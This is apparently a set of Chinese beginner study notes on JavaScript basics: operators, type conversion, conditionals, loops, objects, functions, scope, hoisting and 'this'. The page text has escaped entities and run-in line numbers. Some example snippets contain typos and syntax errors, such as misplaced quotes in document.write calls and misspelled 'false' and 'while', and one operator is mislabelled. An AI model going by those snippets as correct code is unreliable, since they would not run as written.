可以对两个值进行减法预算，并将结果返回* 可以对两个值进行乘法运算&#x2F; 可以对两个值进行除法运算% 可以对两个值进行求余运算我们可以利用这一点，来将任意一个数值类型转换为String 我们只需要为任意的数据类型 + 一个&quot;&quot; 即可将其转换为字符串 这是一种隐式的类型转换，由浏览器自动完成，实际上它也是调用String()函数 任何值做— * &#x2F; 运算时都会自动转换为Number 可以利用这一点进行隐式类型转换 乘除是1 减法是0 原理和Number()函数一样，使用起来更加简单var a &#x3D;123;&#x2F;&#x2F;a &#x3D; a + &quot;&quot;;&#x2F;&#x2F;document.write(typeof a);document.write(&quot;c &#x3D; &quot; + a);var a &#x3D;&quot;123&quot;;a &#x3D; a * 1;document.write(a);var a &#x3D;&quot;123&quot;;a &#x3D; a - 0;document.write(a); 一元运算符1234567891011121314151617181920212223一元运算符，只需要一个操作数 + 正号 - 正好不会对数字产生任何影响 — 负号 - 负号可以对数字进行负号的取反 - 正负得负，负负得正 - 对于非Number类型的值， 他会先转换为Number，然后再运算 可以对一个其他的数据类型使用+，来将其转换为Number 原理和Number()函数一样 var a &#x3D; 123; a &#x3D; -a; var a &#x3D; &quot;123&quot;; a &#x3D; -a &#x2F;*document.write(&quot;a &#x3D; &quot; + a); document.write(typeof a);*&#x2F; var result &#x3D; 1 + +&quot;2&quot; + 3; document.write(&quot;result + &quot; &#x3D; result); document.write(typeof result); 自增自减123456自增 ++ - 通过自增可以使变量再自身的基础上增加1 - 对于一个变量自增以后，原变量的值会立即自增1 自减 -- - 通过自减可以使变量在自身的基础上自减一 逻辑运算符123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960JS提供了三种逻辑运算符 ! 非 - ! 可以用来对一个值进行非运算 - 所谓非运算就是对一个布尔值进行取反操作，比较像!&#x3D; - 进行两次取反，不会变化 - 如果对非布尔值进行非运算，则会先将其转换为布尔值，然后再取反 所以我们可以利用该特点，来讲一个其他的数据类型转换为布尔值 可以为任意一个数据去取反两次，来将其转换为布尔值 原理和Boolean()函数相同 var a &#x3D; 123; a &#x3D; !!a; document.write(&quot;a &#x3D;&quot;a); &amp;&amp; 与 - &amp;&amp;可以对符号两侧的值进行与运算，并返回结果 - 两个值中只要有一个值为flase结果就为flase，比较像 and &#x2F;&#x2F; 第一个值为true，检查第二个值 true &amp;&amp; alert(&quot;你好啊&quot;); &#x2F;&#x2F; 第一个值为false，直接返回false，不去检查第二个值 fales &amp;&amp; alert(&quot;你好啊&quot;); || 或 - ||可以对一个值进或运算,并返回结果 - 两个值中只要有一个值为true结果就为true，比较像 or - JS中的&quot;或&quot;属于，短路或 result &#x3D; false || false result &#x3D; true || false result &#x3D; true || true; document.write(&quot;result &#x3D; &quot;+ result); &amp;&amp; || 非布尔值的情况 - 对于非布尔值进行与或运算时， 会先将其转换为布尔值，然后再运算，并且返回原值- &amp;&amp;与运算 - 如果第一个值时true，则必然返回第二个值 - 如果第一个值为false，直接返回第一个值 &#x2F;&#x2F; true &amp;&amp; true &#x2F;&#x2F; 与运算，如果两个值都为true，则返回后边的 var result &#x3D; 5 &amp;&amp; 6; &#x2F;&#x2F; false &amp;&amp; true result &#x3D; 0 &amp;&amp; 2; &#x2F;&#x2F; 非布尔值里面又false返回false result &#x3D; 2 &amp;&amp; 0; &#x2F;&#x2F; 与运算，如果第一个值为false直接返回第一个值 result &#x3D; NaN &amp;&amp; 0; result &#x3D; 0 &amp;&amp; NaN document.write(&quot;result +&quot;+result);- ||或运算 - 如果第一个值为true直接返回第一个值 - 如果第一个值为false，则直接返回第二个值 &#x2F;&#x2F; 返回结果5var result &#x3D; 5 || 6;返回结果0result &#x3D; NaN || 0; 赋值运算符12345678赋值运算符 &#x3D; 可以将右侧的值赋给左侧的变量 var a &#x3D; 123; +&#x3D; a +&#x3D; 5;等价于a &#x3D; a+5; -&#x3D; a -&#x3D; 5;等价于a &#x3D; a-5; 关系运算符1234567891011121314151617181920212223242526272829通过关系运算符可以比较两个值之间的大小关系， 如果关系成立它会返回true如果关系不成立，返回false &gt; 大于号 关系成立返回true不成立返回发false &gt;&#x3D; 大于等于 关系成立返回true不成立返回发false &lt; 小于 关系成立返回true不成立返回发false &lt;&#x3D; 大于等于 关系成立返回true不成立返回发false 非数值比较 - 对于非数值比较时，会先将其转换为数字，再进行比较 - 如果比较符号两边都是字符串，不会将其转换为数字进行比较 而会分别比较字符串的Unicode编码 NaN和任何值作比较都为false 两个字符串比较时，比较字符串编码在字符串中使用转义字符输入Unicode编码 \\u四位编码,16进制&lt;body&gt; &lt;!--在网页中使用Unicode编码 &amp;#编码; 这里的编码需要的时10进制 --&gt; &lt;h1&gt;&amp;#9760&lt;&#x2F;h1&gt; &lt;&#x2F;body&gt; 相等运算符12345678910111213141516171819202122232425相等运算符用来比较两个值是否相等， 如果相等会返回true，否则返回false 使用&#x3D;&#x3D; 来做想等运算 - 当使用&#x3D;&#x3D;来比较两个值时，如果值的类型不同， 则会自动进行类型转换，将其转换为相同类型 然后在比较是否相等 NaN不和任何值相等，包括他本身 因为NaN不和任何值相等，所以如果要判断这个值是否为NaN 用isNaN()函数来判断一个值是否为NaN 如果成立返回true不成立返回false var a &#x3D; NaN; document.write(isNaN(a)); 不相等 不相等判断两个值是否相等，如果不相等返回true，否则返回false - 用!&#x3D;来判断 &#x3D;&#x3D;&#x3D; 全等 - 用来判断两个值是否全等，他和相等类似，不同的是他不会进行类型转换 如果两个值的类习惯不同，直接返回false !&#x3D;&#x3D; 不全等 - 用来判断两个值是否不全等，和不等类似，不同的是他不会进行类型转换 条件运算符1234567891011121314151617181920条件运算符也叫三元运算符 语法: 条件表达式?语句1:语句2; - 执行流程: 条件运算符在执行时，首席按对条件表达式进行求值 如果该值为true，则执行语句1，并返回执行结果 如果该值为false，则执行语句2，并返回执行结果 如果条件的表达式的求职结果是一个布尔值， 会将其转换为布尔值然后再运算 var a &#x3D; 30; var b &#x3D; 20; var c &#x3D; 50; &#x2F;&#x2F;a&gt;b?alert(&quot;a大&quot;):alert(&quot;a小&quot;); &#x2F;&#x2F; 获取a和b的最大值 var max &#x3D; a&gt;b?a:b; max &#x3D; max&gt;c?max:c; alert(max); 运算符优先级 1234567891011121314151617, 运算符 使用 , 可以分割多个语句，一般可以在声明多个变量时使用， 再JS中有一个运算符优先级的表， 在表中越靠上的优先级越高，优先级越高优先计算， 如果优先级一样，从左往右计算 优先级的表不需要记忆，如果遇到优先级不清楚的 用()括起来 &#x2F;&#x2F; 可以同时声明多个变量并赋值 &#x2F;&#x2F;var a &#x3D; 1 , b &#x3D; 2 , c &#x3D; 3 &#x2F;* 如果||的优先级高，或者和两个一样高，应该返回3 如果&amp;&amp;的优先级高，则应该返回1 *&#x2F; var result &#x3D; 1 || 2 &amp;&amp; 3; alert(result); 代码块12345678我们的程序是由一条一条的语句构成的 语句是按照自上向下的顺序一条一条执行的 再JS中可以使用&#123;&#125;来为语句进行分组， 再同一个&#123;&#125;中的语句我们称为一组语句， 它要么都执行，要么都不执行。 一个&#123;&#125;中的语句我们也称为一个代码块 在代码块的后边也就不用再编写;分号了 JS中的代码块，只具有分组的作用，没有其他的用处 流程控制语句12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&#x2F;* 流程控制语句 - JS中的程序是从上到下一行一行执行的 - 通过流程控制语句可以控制程序执行流程， 程序可以根据一定的条件来选择执行 - 语句分类: 1、条件判断语句 2、条件分支语句 3、循环语句 条件判断语句： - 使用条件判断语句可以再执行某个语句之前进行判断， 如果条件成立才会执行，条件不成立语句不执行 - if语句 - 语法一: if(条件表达式)&#123; 语句... &#125; if语句只能控制紧随其后的那个语句 如果希望if语句可以控制多条语句， 可以将这些语句统一放到代码块中。 if语句后的代码块不是必须的，但是再开发中最好写上代码块， 即使代码块只有一条 *&#x2F;var a &#x3D; 15; if (a &gt; 10 &amp;&amp; a &lt;&#x3D; 20 )&#123; alert(&quot;劳资大于10，但是劳资小于等于20&quot;); &#125;if else 语句 if(条件表达式)&#123; 语句... &#125; else&#123; 语句... &#125; if...else...语句 当该语句执行时，会先对if后的条件表达式进行判断 如果成立执行if后的语句 如果不成立执行else后面的语句 if(条件表达式)&#123; 语句... &#125; else if(条件表达式)&#123; 语句... &#125; else if(条件表达式)&#123; 语句... &#125; else&#123; 语句... &#125; if...else if...else 当该语句执行时，会从上到下依次对条件表达式进行求值判断 如果值为true，则执行当前语句。 如果值为false，则继续向下判断。 如果条件都不满足，执行else语句 语句块中，只会有一个代码块被执行，一旦代码块执行了，则直接结束判断 *&#x2F; age &#x3D; 19; if(age &gt; 80)&#123; alert(&quot;你快完了&quot;); &#125;else if(age&gt;60)&#123; alert(&quot;你不应该工作了&quot;); &#125;else if(age&gt;30)&#123; alert(&quot;你已经中年了&quot;); &#125;else if(age &gt;17)&#123; alert(&quot;你已经成年了&quot;); &#125;else&#123; alert(&quot;你未成年&quot;); &#125; switch…case…default123456789101112131415161718192021222324252627282930313233343536373839404142语法: switch(变量)&#123; case 表达式： 语句.... break case 表达式: 语句.... break ...... default: 语句.... break&#125; 执行流程: switch ... case ... 语句 在执行时会依次将case后的表达式的值和switch后的条件表达式的值进行全等比较 如果比较结果为true，则从当前case处开始执行代码 当前case后的所有的代码都会执行，我们可以在case的后边跟一个break关键字， 这样可以确保只会执行当前case后的语句，而不会执行其他的case 如果比较结果为false，则继续向下比较 如果所有比较都为false，则只执行default后的语句 switch语句和if语句的功能实际上有重复的，使用switch可以实现if的功能 同样使用if也可以实现switch的功能，所以我们在使用时根据自己的习惯选择num &#x3D; 3;switch(num)&#123; case 1: alert(&quot;111&quot;); break;case 2: alert(&quot;222&quot;); break;case 3: alert(&quot;333&quot;); break;default: alert(&quot;非法数字&quot;); break;&#125; while循环12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061向页面中输出连续的数字 &lt;br &#x2F;&gt;是在网页中换行 循环语句： 通过循环语句可以反复的执行一段代码多次 while循环 - 语法: whitle(条件表达式)&#123; 语句... &#125; - while语句再执行时， 先对条件表达式进行判断，如果为true，执行循环体， 第一次循环完毕后，在进行判断，如果还为true，则继续循环u 如果为false，终止循环 do...while循环 - 语法: do&#123; 语句... &#125;while(条件表达式) - 执行流程 do...whlie语句在执行时，会先执行循环体， 循环体执行完毕后，在对while后的条件表达式进行判断 如果结果为true，则继续执行循环体，执行完毕继续判断一次类推 如果结果为false，则终止循环 两个语句的功能类似，不同的是while是先判断后执行， do...while是先执行后判断 do...while可以保证循环体至少执行一次， 而while不能 var n &#x3D; 6; while(n&gt;1)&#123; alert(n); n--; &#125; var count &#x3D; 0; var money &#x3D; 1000; while(money&lt;&#x3D;5000)&#123; money *&#x3D; 1.05; count++; &#125; 输入期末成绩，等于一百奖励一辆BWM,80-99奖励iPhone，60-80奖励一本书,其他什么奖励也没有while(true)&#123; var result &#x3D; prompt(&quot;请输入成绩:&quot;); if(result&gt;&#x3D;0 &amp;&amp; result&lt;&#x3D;100)&#123; break &#125; &#125; if(result&gt;&#x3D;60 &amp;&amp; result&lt;&#x3D;80)&#123; alert(&quot;奖励一本书&quot;); &#125;else if(result&gt;80 &amp;&amp; result&lt;99)&#123; alert(&quot;奖励一台iphone&quot;); &#125;else if(result &#x3D;&#x3D; 100)&#123; alert(&quot;奖励一辆BWM&quot;); &#125;else&#123; alert(&quot;什么奖励也没有&quot;); &#125; for循环12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 for循环的语法: for(初始化表达式;条件表达式;更新表达式)&#123; 语句... &#125; *&#x2F; &#x2F;* result &#x3D; 0 sum &#x3D; 0; for(n &#x3D; 1;n&lt;&#x3D;100;n++)&#123; if(n%7 &#x3D;&#x3D;0)&#123; sum &#x3D; sum+n; result++ &#125; &#125;document.write(sum+&quot;&lt;br &#x2F;&gt;&quot;); document.write(result+&quot;&lt;br &#x2F;&gt;&quot;); *&#x2F; &#x2F;&#x2F;求水仙花数 &#x2F;&#x2F;打印所有的三位数 for(var i &#x3D; 100; i&lt;1000;i++)&#123; &#x2F;&#x2F;获取百位数 var bai &#x3D; parseInt(i&#x2F;100); &#x2F;&#x2F;获取十位数 var shi &#x3D; parseInt((i-bai*100)&#x2F;10); &#x2F;&#x2F;获取个位数 var ge &#x3D; (i%10); &#x2F;&#x2F;判断i是否是水仙花数 if(bai*bai*bai+shi*shi*shi+ge*ge*ge &#x3D;&#x3D; i)&#123; document.write(i+&quot;&lt;br &#x2F;&gt;&quot;); &#125; &#125; 在页面输入数字，判断是否是质数var num &#x3D; prompt(&quot;请输入一个质数数字:&quot;) if(num&lt;&#x3D;1)&#123; alert(&quot;该值不合法&quot;); &#125;else&#123; falg &#x3D; true for(var i &#x3D; 2;i&lt;num;i++)&#123; if(num % i &#x3D;&#x3D;0)&#123; falg&#x3D;false; &#125; &#125; &#125; if(falg)&#123; alert(num+&quot;是质数&quot;); &#125;else&#123; alert(&quot;不是质数&quot;) &#125; 练习1234567891011121314151617181920212223242526272829乘法表for(a&#x3D;1;a&lt;&#x3D;9;a++)&#123; for(i&#x3D;1;i&lt;&#x3D;a;i++)&#123; document.write(i+&quot;*&quot;+a+&quot;&#x3D;&quot;+i*a+&quot;&amp;nbsp;&amp;nbsp;&quot;); &#125;document.write(&quot;&lt;br &#x2F;&gt;&quot;); &#125; 打印2-100之间的所有数 for(var i &#x3D; 2 ; i &lt;&#x3D;100;i++)&#123; &#x2F;&#x2F; 创建一个布尔值，用来保存结果，默认i是质数 var falg &#x3D; true &#x2F;&#x2F; 判断i是否是质数 &#x2F;&#x2F; 获取到2-i之间的所有数 for(var j&#x3D;2; j&lt;i;j++)&#123; &#x2F;&#x2F; 判断i是否能被j整除 if(i%j&#x3D;&#x3D;0)&#123; &#x2F;&#x2F; 如果进入判断则整明i不是质数，修改falg值为false falg&#x3D;false; &#125; &#125; &#x2F;&#x2F; 如果是质数，则打印i的值 if(falg)&#123; document.write(i+&quot;&amp;nbsp&quot;); &#125; &#125; break和continue1234567891011121314151617181920212223&#x2F;* break关键字可以用来退出switch或循环语句 不能在if语句中使用break和continue break关键字，会终止离他最近的循环 *&#x2F; for(i &#x3D; 1; i&lt;&#x3D;5;i++)&#123; document.write(i+&quot;&amp;nbsp&quot;); if(i &#x3D;&#x3D; 4)&#123; break &#125; &#125; &#x2F;* continue关键字可以用来跳过当次循环 同样continue也是默认只会对最近的循环其作用 *&#x2F; for(i &#x3D; 1; i&lt;&#x3D;5;i++)&#123; document.write(i+&quot;&amp;nbsp&quot;); if(i &#x3D;&#x3D; 4)&#123; continue &#125; &#125; 对象的基本操作1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768JS数据类型 - String 字符串 - Number 数值 - Boolean 布尔型 - Null 空 - undefined 未定义 - 以上这五种类型属于基本数据类型，如果我们看到的值 只要不是上面的5中，全都都是对象 - Object 对象 基本数据类型都是单一的值&quot;hellp&quot; 123 true， 值和值之间没有任何的联系。 在JS中标识一个人的信息(name gender age) var name &#x3D; &quot;孙悟空&quot;; var gender &#x3D; &quot;男&quot;; var age &#x3D; 18; 如果使用基本数据类型的数据，我们所创建的变量都是独立的，不能成为一个整体 对象的分类: 1、内建对象 - 由ES标准中定义的对象，在任何的ES的实现中都可以使用 - 比如，Math String Number Boolean Function Object.... 2、宿主对象 - 由JS的运行环境提供的对象，目前来讲主要由浏览器提供的对象 - 比如 BOM DOM 3、自定义对象 - 由开发人员自己创建的对象 &#x2F;&#x2F;创建对象 使用new关键字调用的函数，是构造函数constructor 构造函数时专门用来创建对象的函数 使用typeof检查一个对象时，返回object var obj &#x3D; new Object(); 在对象中保存的值成为属性 向对象添加属性 语法:对象.属性名 &#x3D; 属性值; 如果读取对象中没有属性，不会报错而是返回undefined &#x2F;&#x2F; 向obj中添加一个name属性 obj.name &#x3D; &quot;孙悟空&quot;; &#x2F;&#x2F; 向obj中添加一个gender属性 obj.gender &#x3D; &quot;男&quot;; obj.age &#x3D; 18; 读取对象中的属性 语法: 对象.属性名 &#x2F;&#x2F;document.write(obj.gender); 修改对象的属性值 语法: 对象.属性名 &#x3D; 新值 obj.name &#x3D; &quot;齐天大圣&quot; document.write(obj.name); 删除对象属性 语法：delete 对象.属性名 delete obj.name; document.write(obj.name); 属性名和属性值12345678910111213141516171819202122232425262728293031323334353637383940414243444546向对象中添加属性 - 对象的属性名不强制要求遵守标识符的规范 什么乱七八糟的名字都可以使用 - 但是在使用的时候最好还是按照标识符的规范去做 obj.name &#x3D; &quot;孙悟空&quot; 如果要使用特殊的属性名，不能采用.的方式来操作 需要时用另一种方式： 语法：对象[&quot;属性名&quot;] &#x3D; 属性值 读取时也要采用这种方式 使用[]这种形式去操作属性，更加的灵活， 在[]中可以直接传递一个变量，这样变量值时多少就会读取那个属性 obj[&quot;123&quot;] &#x3D; 456; obj[&quot;nihao&quot;] &#x3D; &quot;你好&quot; var a &#x3D; &quot;nihao&quot; document.write(obj[a]); 属性值 JS对象的属性值，可以是任意的数据类型 是指也可以是一个对象 obj.text &#x3D; true; document.write(obj.text); &#x2F;&#x2F; 创建一个对象 var obj2 &#x3D; new Object(); obj2.name &#x3D; &quot;猪八戒&quot; &#x2F;&#x2F; 将obj2设置为obj属性 obj.test &#x3D; obj2; document.write(obj.test.name); in运算符 - 通过该运算符可以检查一个对象中是否含有指定的属性 如果有则返回true，没有返回false 语法： &quot;属性名&quot; in 对象 &#x2F;&#x2F; 价差obj中是否含有obj2这个属性 &#x2F;&#x2F; document.write(&quot;test2&quot; in obj); &#x2F;&#x2F; document.write(&quot;test&quot; in obj); document.write(&quot;name&quot; in obj); 基本和引用数据类型12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849基本数据类型 String Number Boolean Null undefined 引用数据类型 Object JS中的变量都是保存到栈内存中的， 基本数据类型的值直接在栈内存中存储， 值与值之间是独立存在，修改一个变量不会影响其他的变量 对象是保存到堆内存的，每创建一个新的对象，就会在堆内存中开辟出一个新的空间 而变量保存的是对象的内存地址(对象的引用),如果两个变量保存的是同一个对象引用， 当一个通过一个变量修改属性时，另一个也会受到影响 var a &#x3D; 123;var b &#x3D; a;a++; &#x2F;&#x2F; a和b的两个值是完全独立的，一个值的变化并不会影响另一个值 document.write(&quot;a &#x3D; &quot;+ a); &#x2F;&#x2F; 124 document.write(&quot;b &#x3D; &quot;+ b); &#x2F;&#x2F; 123 &#x2F;&#x2F; 修改一个值后，另一个值也跟着变化 var obj &#x3D; new Object(); obj.name &#x3D; &quot;孙悟空&quot;; var obj2 &#x3D; obj; &#x2F;&#x2F; 修改obj的name属性 obj.name &#x3D; &quot;唐僧&quot; document.write(obj.name); document.write(obj2.name); &#x2F;&#x2F; 设置obj2为null&#x2F;&#x2F; 当修改变量的值的时候，对其它对象没有影响 obj2 &#x3D; null; document.write(obj); document.write(obj2); var obj3 &#x3D; new Object(); var obj4 &#x3D; new Object(); obj3.name &#x3D; &quot;沙和尚&quot;; obj4.name &#x3D; &quot;沙和尚&quot;; document.write(obj3.name); document.write(obj4.name); document.write(obj3 &#x3D;&#x3D; obj4); 当比较两个基本数据类型的值时，就是比较值。 而比较两个引用数据类型时，他是比较的对象的内存地址， 如果两个对象是一模一样的，但是地址不同，他也会返回false 对象字面量123456789101112131415161718192021222324252627282930313233&#x2F;&#x2F; 创建一个对象 &#x2F;&#x2F; var obj &#x3D; new Object(); &#x2F;* 使用对象字面量来创建一个对象 *&#x2F; &#x2F;&#x2F; 使用&#123;&#125;大括号创建对象和new Object()是一样的 &#x2F;&#x2F; 使用&#123;&#125;大括号更加方便 var obj &#x3D; &#123;&#125;; &#x2F;&#x2F;document.write(obj); obj.name &#x3D; &quot;Sun&quot; &#x2F;&#x2F;document.write(obj.name); &#x2F;* 使用对象字面量可以在创建对象时，直接指定对象中的属性 语法：&#123;属性名:属性值,属性名:属性值......&#125; 对象字面量的属性名可以加引号也可以不加，建议不加， 如果使用一些特殊的属性名，必须加引号 例如:&quot;@!#!@$&quot; 属性名和属性值是一组一组的名值对结构, 名和值之间使用 &quot;:&quot; 冒号连接，多个名值对之间使用 &quot;,&quot; 逗号隔开 如果只有一个属性，不跟其他属性就不要写 &quot;,&quot; 逗号了 *&#x2F; &#x2F;&#x2F; 创建了一个对象，同时为这个对象添加了一个属性 &#x2F;&#x2F; 属性的名字叫name，属性的值叫做 &quot;猪八戒&quot; &#x2F;&#x2F; 可以创建多个属性 var obj2 &#x3D; &#123; name:&quot;猪八戒&quot;, age:28, &#125;; &#x2F;&#x2F; 在页面输出 document.write(obj2.name,obj2.age); 函数的介绍12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&#x2F;* 函数 - 函数也是一个对象 - 函数中可以封装一些功能(代码)，在需要时可以执行这些功能(代码) - 函数中可以保存一些代码在需要的时候调用 - 使用typeof检查一个函数对象时，会返回function *&#x2F; &#x2F;* 不使用这种构造函数 &#x2F;&#x2F; 在实际开发中很少使用构造函数对象 &#x2F;&#x2F; 创建一个函数对象 &#x2F;&#x2F; 可以将要封装的代码以字符串的形式传递给构造函数 &#x2F;&#x2F; var fun &#x3D; new Function(&quot;document.write(&#39;Hello 这是我的第一个函数&#39;);&quot;); &#x2F;&#x2F; 封装到函数中的代码不会立即执行 &#x2F;&#x2F; 函数中的代码会在函数调用的时候执行 &#x2F;&#x2F; 调用函数语法，函数对象() &#x2F;&#x2F; 当调用函数时，函数中封装的代码会按照顺序执行 &#x2F;&#x2F; fun(); &#x2F;&#x2F; document.write(typeof fun); &#x2F;&#x2F; document.write(fun); *&#x2F; &#x2F;* 使用函数声明来创建一个函数 语法: function 函数名([形参1,形参2...形参N])&#123; 语句.... &#125; *&#x2F; function fun2()&#123; document.write(&quot;这是我的第二个函数&quot;); alert(&quot;哈哈哈哈&quot;); console.log(&quot;&#x2F;(ㄒoㄒ)&#x2F;~~&quot;); &#125; &#x2F;&#x2F; 调用fun2 &#x2F;&#x2F; fun2(); &#x2F;* 使用函数表达式来创建一个函数 var 函数名 &#x3D; function([形参1,形参2...形参N])&#123; 语句... &#125; *&#x2F; var fun3 &#x3D; function()&#123; document.write(&quot;匿名函数&quot;); &#125; fun3(); 函数参数12345678910111213141516171819202122232425262728293031323334&#x2F;* 定义一个用来求两个数的和的函数 可以在函数的()中来指定一个或多个形参(形式参数) 多个形参之间使用,号隔开，声明形参就相当于在函数内部声明了对应的变量 但是并不赋值 *&#x2F; function sum(a,b)&#123; document.write(a+b); &#125; &#x2F;* 在调用函数时，可以在()中指定实参 实参将会赋值给函数中对应的形参 *&#x2F; &#x2F;* &#x2F;&#x2F; sum(5,2); sum(123,56); sum(123,&quot;hello&quot;); *&#x2F; &#x2F;* 调用函数时，解析器不会检查实参类型 所以要注意是否有可能会接收到非法的参数，如果有可能则要对我们的参数进行类型检查 函数的实参可以是任意的数据类型 *&#x2F; &#x2F;* 调用函数时，解析器也不会检查实参数量 多余的实参不会被赋值 如果实参的数量少于形参的数量，则没有对应实参的形参将是undefined *&#x2F; &#x2F;&#x2F; sum(123,456,1); 函数的返回值123456789101112131415161718192021222324252627&#x2F;* 创建一个函数，用来计算三个数的和 可以使用return 来设置函数的返回值 语法： return 值 return后的值将会作为函数的执行结果返回， 可以定义一个变量，来接收该结果 在函数中return后的语句都不会被执行 如果return语句后面不跟任何值就相当于返回一个undefined 如果函数中不屑return,则也会返回undefined return后可以跟任意类型的值 *&#x2F; function sum(a,b,c)&#123; &#x2F;&#x2F; document.write(a+b+c); var d &#x3D; a+b+c; return d; &#125; &#x2F;&#x2F; 调用函数 &#x2F;&#x2F; 变量return的值就是函数的执行结果 &#x2F;&#x2F; 函数返回什么result的值就是什么 var result &#x3D; sum(1,2,3); document.write(&quot;result &#x3D; &quot;+ result); 立即执行函数1234567891011121314151617181920&#x2F;&#x2F; 如果直接写匿名函数执行会报错，如果用()括号将他圈起来， &#x2F;&#x2F; 整明他是一个整体就不会报错 (function()&#123; alert(&quot;匿名函数~~&quot;); &#125;); &#x2F;&#x2F; 函数对象() &#x2F;* 立即执行函数 函数定义完，立即被调用，这种函数叫做立即执行函数 立即执行往往只会执行1次 *&#x2F; &#x2F;* (function()&#123; alert(&quot;匿名函数~~&quot;); &#125;)(); *&#x2F; (function(a,b)&#123; document.write(&quot;a &#x3D; &quot;+ a); document.write(&quot;b &#x3D; &quot;+ b); &#125;)(123,222); 枚举对象中的属性12345678910111213141516171819202122232425262728293031&#x2F;* 枚举对象中的属性 *&#x2F; var obj &#x3D; &#123; name:&quot;孙悟空&quot;, age:18, gender:&quot;男&quot;, address:&quot;花果山&quot; &#125;; &#x2F;&#x2F; 例如我们不知道obj中的属性， &#x2F;&#x2F; 但是我们想要知道obj中都有什么属性 &#x2F;&#x2F; 枚举对象中的属性 &#x2F;&#x2F; 使用for in 语句 &#x2F;* 语法： for(var 变量 in 对象)&#123; 语句... &#125; for...in语句，对象中有几个属性，循环体就会执行几次 每次执行时，会将对象中的一个属性的名字赋值给变量 *&#x2F; &#x2F;* for(var n in obj)&#123; document.write(&quot;属性名&quot;+n+&quot;&lt;br &#x2F;&gt;&quot;); &#125; *&#x2F; for(var n in obj)&#123; document.write(&quot;属性名 :&quot;+n+&quot;&lt;br &#x2F;&gt;&quot;); document.write(obj[n]+&quot;&lt;br &#x2F;&gt;&quot;); &#125; 作用域123456789101112131415161718192021222324作用域 - 作用域指一个变量的作用的范围 - 在JS中一共有两种作用域： 1、全局作用域 - 直接编写在scripe标签中的JS代码，都在全局作用域中 - 全局作用域在页面打开时创建，在页面关闭时销毁 - 在全局作用域中有一个全局对象window， 它代表的是一个浏览器的窗口，它由浏览器创建，我们可以直接使用 - 在全局作用域中， 创建的变量都会作为window对象的属性保存 创建的函数都会做为window对象的方法保存 - 全局作用域中的变量都是全局变量， 在页面的任意的部分都可以访问到 2、函数作用域 *&#x2F; var a &#x3D; 10 &#x2F;&#x2F; console.log(window.a); function fun()&#123; console.log(&quot;Fun函数&quot;); &#125; 变量的声明提前12345678910111213141516171819202122232425262728&#x2F;* 变量的声明提前 - 使用var关键字声明的变量，会在所有的代码执行之前被声明（但是不会赋值） 但是如果声明变量时不使用var关键字，则变量不会被提前声明 函数的声明提前 - 使用函数声明形式创建的函数function 函数()&#123;&#125; 他会在所有代码执行之前就被创建，所以我们可以在函数声明前来调用函数 使用函数表达式创建的函数，不能被声明提前，所以不能在声明前调用 *&#x2F; console.log(&quot;a &#x3D; &quot;+a); var a &#x3D; 123; &#x2F;&#x2F;fun(); fun2() &#x2F;&#x2F; 函数声明，会被提前创建 function fun()&#123; console.log(&quot;Fun函数&quot;); &#125; &#x2F;&#x2F; 变量会被提前创建，但是函数表达式不会被提前创建 var fun2 &#x3D; function()&#123; console.log(&quot;Fun函数2&quot;); &#125;; 函数作用域12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&#x2F;* 函数作用域 - 调用函数时创建函数作用域，函数执行完毕以后，函数作用域销毁 - 每调用一次函数就会创建一个新的函数作用域，他们之间是相互独立的 - 在函数作用域中可以访问到全局变量，在全局作用域中无法访问到函数作用的变量 可以理解为:内部可以访问外部，但外部不能访问内部 - 当在函数作用域操作一个变量时，他会先在自身作用域寻找，如果有就直接使用 如果没有则向上一级作用域寻找，直到找到全局作用域 如果全局作用域中依然没有找到，则会报错ReferenceError - 在函数中要访问全局变量可以使用window对象 *&#x2F; &#x2F;* var a &#x3D; 10 function fun()&#123; var b &#x3D; 20; console.log(&quot;a &#x3D; &quot;+a); &#125; fun(); cosole.log(&quot;b &#x3D; &quot;+b); *&#x2F; &#x2F;* 在函数作用域中也有声明提前的特性， 使用var关键字声明变量，会在函数中所有的代码执行之前被声明 函数声明也会在函数中所有的代码执行之前执行 *&#x2F; function fun3()&#123; fun4(); &#x2F;&#x2F; console.log(a); &#x2F;&#x2F; 返回undefined ,因为定义的变量在下面，var a 已经提前声明好了，但是没赋值 var a &#x3D; 35; function fun4()&#123; alert(&quot;fun4函数能否被调用&quot;); &#125; &#125; fun3(); var c &#x3D; 22; &#x2F;* 在函数中，不使用var声明的变量都会成为全局变量 *&#x2F; function fun5()&#123; &#x2F;&#x2F; console.log(&quot;c &#x3D; &quot;+ c); c &#x3D; 10; &#125; fun5 this123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&#x2F;* 解析器在调用函数每次都会向函数内部传递进一个隐含的参数 这个隐含参数就是this.this指向的是一个都西昂， 这个对象我们称为函数执行的上下文对象 根据函数的调用方式不同，this会指向不同的对象 1、以函数的形式调用时，this永远都是window 2、以方法的形式调用是，this就是调用方法的那个对象 *&#x2F; &#x2F;* function fun()&#123; &#x2F;&#x2F; console.log(&quot;a &#x3D; &quot;+a+&quot;b &#x3D; &quot;+b); console.log(this.name); &#125; &#x2F;&#x2F; fun(); var obj&#x3D;&#123; name:&quot;孙悟空&quot;, sayName:fun &#125;; var obj2 &#x3D; &#123; name:&quot;猪八戒&quot;, sayName:fun &#125;; &#x2F;&#x2F; console.log(obj.sayName &#x3D;&#x3D; fun); var name &#x3D; &quot;全局的name属性&quot;; &#x2F;&#x2F; obj.sayName(); &#x2F;&#x2F; 以函数的而形式调用，this是window &#x2F;&#x2F; fun(); &#x2F;&#x2F; 以方法的形式调用，this是调用方法的对象 &#x2F;&#x2F; obj.sayName(); *&#x2F; &#x2F;&#x2F; 创建一个name变量 var name &#x3D; &quot;全局&quot;; obj2.sayName(); &#x2F;&#x2F; 创建一个fun()函数 function fun()&#123; console.log(this.name); &#125;; &#x2F;&#x2F; 创建两个对象 var obj &#x3D; &#123; name:&quot;孙悟空&quot;, sayName:fun &#125;; var obj2 &#x3D; &#123; name:&quot;猪八戒&quot;, sayName:fun &#125;; &#x2F;&#x2F; 我们调用sayName()时可以输出obj的名字 obj.sayName(); 